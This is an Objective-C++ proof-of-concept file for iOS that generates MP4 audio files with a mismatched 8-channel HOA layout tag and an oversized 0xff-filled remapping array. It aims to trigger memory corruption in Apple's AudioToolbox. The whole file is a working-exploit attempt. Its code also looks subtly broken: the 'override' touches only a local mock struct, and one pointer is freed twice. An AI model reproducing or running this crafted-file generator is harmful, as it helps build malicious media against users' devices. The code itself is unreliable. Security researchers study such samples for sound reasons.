//clang++ -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -framework AVFAudio -framework AudioToolbox -std=c++11 poc_variation3.mm -o poc_variation3
//A single-channel audio stream. mChannelLayoutTag set to 8 channels (kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8), mismatching the 1-channel input.
//A 65,536-byte mRemappingArray filled with 0xff. Random audio buffer values in [-1.0, 1.0].

@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout);
    }
  }
};

void OverrideApac(CodecConfig* config) {
  if (config->remappingChannelLayout) {
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
  }
  config->mRemappingArray.resize(0x10000, 0xff); // Pre-size and fill with 0xff
}

int main() {
  std::vector<double> sampleRates = {8000, 16000, 44100, 48000, 96000};
  std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM, kAudioFormatMPEG4AAC};
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> formatDist(0, formats.size() - 1);

  for (double sampleRate : sampleRates) {
    AudioFormatID formatID = formats[formatDist(gen)];
    uint32_t channelNum = 1;
    AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate
                                                                             channels:channelNum];
    AudioStreamBasicDescription outputDescription = {
        .mSampleRate = sampleRate,
        .mFormatID = formatID,
        .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat : 0,
        .mBytesPerPacket = 0,
        .mFramesPerPacket = 0,
        .mBytesPerFrame = 0,
        .mChannelsPerFrame = channelNum,
        .mBitsPerChannel = 0,
        .mReserved = 0};

    AVAudioChannelLayout* channelLayout =
        [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];

    CodecConfig config;
    // Copy the channel layout to avoid const issues
    AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)malloc(sizeof(AudioChannelLayout));
    if (!channelLayoutCopy) {
      fprintf(stderr, "Memory allocation failed for sample rate %.0f\n", sampleRate);
      continue;
    }
    memcpy(channelLayoutCopy, channelLayout.layout, sizeof(AudioChannelLayout));
    config.remappingChannelLayout = channelLayoutCopy;

    OverrideApac(&config);

    NSString* fileName = [NSString stringWithFormat:@"output_%.0f_%u.mp4", sampleRate, formatID];
    NSURL* outUrl = [NSURL fileURLWithPath:fileName];
    ExtAudioFileRef audioFile = nullptr;
    OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type,
                                                &outputDescription, config.remappingChannelLayout,
                                                kAudioFileFlags_EraseFile, &audioFile);
    if (status) {
      fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      free(channelLayoutCopy);
      continue;
    }

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                     sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
    if (status) {
      fprintf(stderr, "Error setting format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                     sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
    if (status) {
      fprintf(stderr, "Error setting layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }

    float audioBuffer[44100];
    std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
    for (int i = 0; i < 44100; ++i) {
      audioBuffer[i] = dis(gen);
    }
    AudioBufferList audioBufferList = {
        .mNumberBuffers = 1,
        .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = sizeof(audioBuffer), .mData = audioBuffer}},
    };
    status = ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
    if (status) {
      fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    }

    status = ExtAudioFileDispose(audioFile);
    if (status) {
      fprintf(stderr, "Error closing file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    }

    free(channelLayoutCopy);
  }
  return 0;
}
